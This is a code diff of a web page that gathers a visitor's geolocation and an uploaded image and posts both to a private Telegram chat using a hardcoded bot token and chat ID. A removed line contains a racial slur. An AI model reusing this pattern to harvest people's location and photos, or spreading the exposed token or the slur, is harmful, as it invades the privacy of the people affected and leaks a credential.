@@ -8,8 +8,8 @@
     <button onclick="getLocation()">Get Location</button>
     <p id="location"></p>
     
-    <textarea id="userMessage" placeholder="nigaa nigga"></textarea>
-    <button onclick="sendMessage()">Send Message</button>
+    <input type="file" id="imageInput" accept="image/*">
+    <button onclick="sendImage()">Send Image</button>
 
     <script>
         var latitude, longitude;
@@ -47,23 +47,31 @@
             }
         }
 
-        function sendMessage() {
-            var userMessage = document.getElementById("userMessage").value;
-            sendLocationToTelegram(latitude, longitude, userMessage);
+        function sendImage() {
+            var imageInput = document.getElementById("imageInput");
+            if (imageInput.files && imageInput.files[0]) {
+                var file = imageInput.files[0];
+                sendImageToTelegram(file);
+            } else {
+                alert("Please select an image first.");
+            }
         }
 
-        function sendLocationToTelegram(latitude, longitude, userMessage) {
-            var botToken = '7290471633:AAE0A_sbbmf8Z-Xm-1hsk7DCtXezNGiCpVk';
-            var chatId = '-1002148840772';
-            var message = `User location: Latitude: ${latitude}, Longitude: ${longitude}\nMessage: ${userMessage}`;
+        function sendImageToTelegram(file) {
+            var botToken = '7290471633:AAE0A_sbbmf8Z-Xm-1hsk7DCtXezNGiCpVkN';
+            var chatId = '1002148840772';
+            var formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", file);
+            if (latitude && longitude) {
+                formData.append("caption", `User location: Latitude: ${latitude}, Longitude: ${longitude}`);
+            } else {
+                formData.append("caption", "User location not available.");
+            }
 
-            // URL to send message to Telegram chat
-            var telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            // Create a new XMLHttpRequest object
             var xhr = new XMLHttpRequest();
-            xhr.open("GET", telegramUrl, true);
-            xhr.send();
+            xhr.open("POST", `https://api.telegram.org/bot${botToken}/sendPhoto`, true);
+            xhr.send(formData);
         }
     </script>
 </body>
